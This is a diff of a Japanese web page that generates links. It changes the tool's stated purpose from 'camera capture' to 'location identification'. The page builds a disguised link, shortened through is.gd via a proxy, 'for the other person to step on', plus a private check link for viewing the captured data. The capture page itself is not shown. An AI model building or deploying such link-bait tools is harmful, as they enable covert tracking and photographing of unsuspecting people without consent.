@@ -4,14 +4,13 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-  <!-- OGP設定 -->
-  <meta property="og:title" content="カメラ撮影ツール">
-  <meta property="og:description" content="相手に踏ませる用、撮影データ確認用URLを自動生成します">
+  <meta property="og:title" content="位置情報特定ツール">
+  <meta property="og:description" content="相手に踏ませる用、確認用URLを自動生成">
   <meta property="og:type" content="website">
-  <meta property="og:url" content="https://ginginman-infinity.github.io/-/generate.html">
+  <meta property="og:url" content="https://ginginman-infinity.github.io/Location-information2/generate.html">
   <meta name="twitter:card" content="summary">
 
-  <title>撮影URL生成ツール</title>
+  <title>URL生成ツール</title>
 
   <style>
     body {
@@ -53,7 +52,7 @@
   </style>
 </head>
 <body>
-  <h1>📸 カメラ撮影URL生成ツール</h1>
+  <h1>リンク生成ツール</h1>
   <p>ボタンを押すと、相手用（短縮URL）と確認用URLが自動で作られます。</p>
 
   <button id="generateBtn">リンクを生成する</button>
@@ -73,56 +72,50 @@
   </div>
 
   <script>
-  // --- URL短縮関数（is.gd + alloriginsでCORS回避）---
   async function shortenUrl(longUrl) {
-    try {
-      const proxy = "https://api.allorigins.win/raw?url=";
-      const apiUrl = `https://is.gd/create.php?format=simple&url=${encodeURIComponent(longUrl)}`;
-      const response = await fetch(proxy + encodeURIComponent(apiUrl));
-      const shortUrl = await response.text();
-      return shortUrl.trim();
-    } catch (error) {
-      console.error("短縮に失敗しました:", error);
-      return longUrl;
+  try {
+    const proxy = "https://api.allorigins.win/raw?url=";
+    const apiUrl = `https://is.gd/create.php?format=simple&url=${encodeURIComponent(longUrl)}`;
+    const response = await fetch(proxy + encodeURIComponent(apiUrl));
+    const shortUrl = await response.text();
+    return shortUrl.trim();
+  } catch (error) {
+    console.error("短縮に失敗しました:", error);
+    return longUrl;
+  }
+}
+
+    function copyText(text, button) {
+      navigator.clipboard.writeText(text).then(() => {
+        button.textContent = "✅ コピー済み";
+        button.classList.add("copied");
+        setTimeout(() => {
+          button.textContent = "📋 コピー";
+          button.classList.remove("copied");
+        }, 1500);
+      });
     }
-  }
 
-  // --- コピー機能 ---
-  function copyText(text, button) {
-    navigator.clipboard.writeText(text).then(() => {
-      button.textContent = "✅ コピー済み";
-      button.classList.add("copied");
-      setTimeout(() => {
-        button.textContent = "📋 コピー";
-        button.classList.remove("copied");
-      }, 1500);
+    document.getElementById("generateBtn").addEventListener("click", async () => {
+      const id = Math.random().toString(36).substring(2, 9);
+      const baseUrl = window.location.origin + window.location.pathname.replace("generate.html", "");
+      const targetUrl = `${baseUrl}index.html?id=${id}`;
+      const checkUrl = `${baseUrl}check.html?id=${id}`;
+
+      // 相手用URLを短縮
+      const shortTargetUrl = await shortenUrl(targetUrl);
+
+      // 表示
+      document.getElementById("targetLink").textContent = shortTargetUrl;
+      document.getElementById("targetLink").href = shortTargetUrl;
+      document.getElementById("checkLink").textContent = checkUrl;
+      document.getElementById("checkLink").href = checkUrl;
+      document.getElementById("result").style.display = "block";
+
+      // コピー機能
+      document.getElementById("copyTarget").onclick = () => copyText(shortTargetUrl, document.getElementById("copyTarget"));
+      document.getElementById("copyCheck").onclick = () => copyText(checkUrl, document.getElementById("copyCheck"));
     });
-  }
-
-  // --- 生成ボタン処理 ---
-  document.getElementById("generateBtn").addEventListener("click", async () => {
-    const id = Math.random().toString(36).substring(2, 9);
-
-    // あなたのGitHub PagesベースURL
-    const baseUrl = "https://ginginman-infinity.github.io/-/";
-
-    const targetUrl = `${baseUrl}index.html?id=${id}`;  // 相手用（撮影ページ）
-    const checkUrl = `${baseUrl}check.html?id=${id}`;   // 確認用
-
-    // 相手用URLを短縮
-    const shortTargetUrl = await shortenUrl(targetUrl);
-
-    // 表示
-    document.getElementById("targetLink").textContent = shortTargetUrl;
-    document.getElementById("targetLink").href = shortTargetUrl;
-    document.getElementById("checkLink").textContent = checkUrl;
-    document.getElementById("checkLink").href = checkUrl;
-    document.getElementById("result").style.display = "block";
-
-    // コピー機能セット
-    document.getElementById("copyTarget").onclick = () => copyText(shortTargetUrl, document.getElementById("copyTarget"));
-    document.getElementById("copyCheck").onclick = () => copyText(checkUrl, document.getElementById("copyCheck"));
-  });
   </script>
 </body>
 </html>
